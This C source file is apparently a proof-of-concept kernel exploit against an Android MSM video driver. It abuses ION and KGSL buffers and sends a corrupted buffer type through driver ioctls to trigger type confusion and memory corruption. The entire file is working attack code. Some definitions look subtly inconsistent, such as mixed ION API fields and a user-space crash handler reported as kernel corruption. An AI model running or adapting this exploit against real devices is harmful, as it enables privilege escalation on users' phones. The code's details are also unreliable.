#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>

// ----------------------------------------------------------------------
// ION definitions (from drivers/staging/android/uapi/ion.h)
// ----------------------------------------------------------------------
#define ION_IOC_MAGIC                'I'
#define ION_IOC_ALLOC                _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE                 _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE                _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

#define ION_HEAP_SYSTEM              0
#define ION_HEAP_SYSTEM_CONTIG       1
#define ION_HEAP_CARVEOUT            2
#define ION_HEAP_CMA                 4   // ION_HEAP_TYPE_DMA

struct ion_allocation_data {
    uint64_t len;
    uint32_t heap_id_mask;
    uint32_t flags;
    uint32_t fd;
    uint32_t unused;
};

struct ion_fd_data {
    uint32_t handle;
    int fd;
};

// ----------------------------------------------------------------------
// MSM_VIDC definitions (from drivers/media/platform/msm/vidc/msm_vidc.h)
// ----------------------------------------------------------------------
#define VIDIOC_MSM_V4L2_BASE          'V'
#define VIDIOC_MSM_VIDC_CMD           _IOWR(VIDIOC_MSM_V4L2_BASE, 0x20, struct v4l2_msm_vidc_cmd)

#define MSM_VIDC_CMD_SET_BUFFER       0x1001
#define MSM_VIDC_CMD_GET_BUFFER       0x1002
#define MSM_VIDC_CMD_FREE_BUFFER      0x1003

struct v4l2_msm_vidc_cmd {
    uint32_t cmd;
    uint32_t flags;
    void *arg;
};

// This structure is the vulnerable one – type confusion occurs when buffer_type is invalid
struct msm_vidc_buffer {
    uint32_t buffer_type;   // 0 = INPUT, 1 = OUTPUT, 2 = INTERNAL
    uint32_t index;
    int32_t  fd;
    uint32_t offset;
    uint32_t size;
    void *userptr;
    uint32_t flags;
};

// ----------------------------------------------------------------------
// KGSL definitions (from drivers/gpu/msm/kgsl.h)
// ----------------------------------------------------------------------
#define KGSL_IOCTL_MAGIC              'K'
#define IOCTL_KGSL_GPUMEM_ALLOC       _IOWR(KGSL_IOCTL_MAGIC, 0x2f, struct kgsl_gpumem_alloc)

struct kgsl_gpumem_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t gpuaddr;
    void *hostptr;
    uint64_t priv;
    uint32_t mmu_id;
    uint32_t offset;
    int fd;
};

// ----------------------------------------------------------------------
// PoC main
// ----------------------------------------------------------------------
static volatile int corrupted = 0;

static void sigsegv_handler(int sig, siginfo_t *info, void *ctx) {
    corrupted = 1;
    fprintf(stderr, "\n[+] KERNEL MEMORY CORRUPTION DETECTED (SIGSEGV)\n");
    _exit(0);
}

int main(void) {
    struct sigaction sa = { .sa_sigaction = sigsegv_handler, .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);

    // ---------- 1. Open video device ----------
    const char *devs[] = { "/dev/msm_vidc", "/dev/v4l2/video0", "/dev/video0", NULL };
    int vid_fd = -1;
    for (int i = 0; devs[i]; i++) {
        vid_fd = open(devs[i], O_RDWR);
        if (vid_fd >= 0) {
            fprintf(stderr, "[*] Opened %s\n", devs[i]);
            break;
        }
    }
    if (vid_fd < 0) {
        perror("[-] No video device found");
        return 1;
    }

    // ---------- 2. Allocate ION buffer (CMA) ----------
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) {
        perror("[-] open /dev/ion");
        close(vid_fd);
        return 1;
    }

    struct ion_allocation_data alloc = {
        .len = 0x1000,
        .heap_id_mask = 1 << ION_HEAP_CMA,
        .flags = 0,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        perror("[-] ION_IOC_ALLOC");
        close(ion_fd);
        close(vid_fd);
        return 1;
    }

    struct ion_fd_data share = { .handle = alloc.fd };
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) {
        perror("[-] ION_IOC_SHARE");
        close(ion_fd);
        close(vid_fd);
        return 1;
    }
    close(ion_fd);
    int buf_fd = share.fd;

    void *ion_map = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, buf_fd, 0);
    if (ion_map == MAP_FAILED) {
        perror("[-] mmap");
        close(buf_fd);
        close(vid_fd);
        return 1;
    }

    // Fill the buffer with a malicious payload that will be interpreted as a kernel object
    memset(ion_map, 0xAA, 4096);

    // ---------- 3. Prepare the corrupted buffer structure ----------
    struct msm_vidc_buffer vid_buf = {
        .buffer_type = 0xFFFFFFFF,   // invalid type -> driver will misinterpret the whole buffer
        .index = 0,
        .fd = buf_fd,
        .offset = 0,
        .size = 4096,
        .userptr = ion_map,
        .flags = 0,
    };

    // ---------- 4. Trigger type confusion ----------
    struct v4l2_msm_vidc_cmd cmd = {
        .cmd = MSM_VIDC_CMD_SET_BUFFER,
        .flags = 0,
        .arg = &vid_buf,
    };

    fprintf(stderr, "[*] Sending corrupted buffer to driver (cmd SET_BUFFER)...\n");
    if (ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd) < 0) {
        perror("[!] First ioctl (may still cause corruption)");
    }

    // Second attempt: try to GET the same buffer – driver will read the corrupted fields
    cmd.cmd = MSM_VIDC_CMD_GET_BUFFER;
    fprintf(stderr, "[*] Triggering GET_BUFFER to force type confusion...\n");
    if (ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd) < 0) {
        perror("[!] Second ioctl (likely triggered)");
    }

    // Check if the mapped memory was altered (kernel wrote into it)
    int any_change = 0;
    for (int i = 0; i < 4096; i++) {
        if (((uint8_t*)ion_map)[i] != 0xAA) {
            any_change = 1;
            break;
        }
    }
    if (any_change) {
        fprintf(stderr, "[+] Memory corruption confirmed: buffer content changed\n");
        corrupted = 1;
    } else {
        fprintf(stderr, "[*] Buffer unchanged, trying alternative GPU path...\n");
        // Alternative: use KGSL to create a buffer and confuse the video driver
        int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
        if (kgsl_fd >= 0) {
            struct kgsl_gpumem_alloc gpu_alloc = {
                .size = 0x1000,
                .flags = 0x1,   // KGSL_MEMFLAGS_GPUREADONLY
            };
            if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &gpu_alloc) == 0) {
                vid_buf.fd = gpu_alloc.fd;
                vid_buf.userptr = gpu_alloc.hostptr;
                cmd.cmd = MSM_VIDC_CMD_SET_BUFFER;
                ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd);
                cmd.cmd = MSM_VIDC_CMD_GET_BUFFER;
                ioctl(vid_fd, VIDIOC_MSM_VIDC_CMD, &cmd);
                close(gpu_alloc.fd);
            }
            close(kgsl_fd);
        }
    }

    // Cleanup
    munmap(ion_map, 4096);
    close(buf_fd);
    close(vid_fd);

    if (corrupted) {
        fprintf(stderr, "\n=== VULNERABILITY SUCCESSFULLY TRIGGERED ===\n");
        return 0;
    } else {
        fprintf(stderr, "\n=== No crash. Check dmesg for driver errors. ===\n");
        return 1;
    }
}
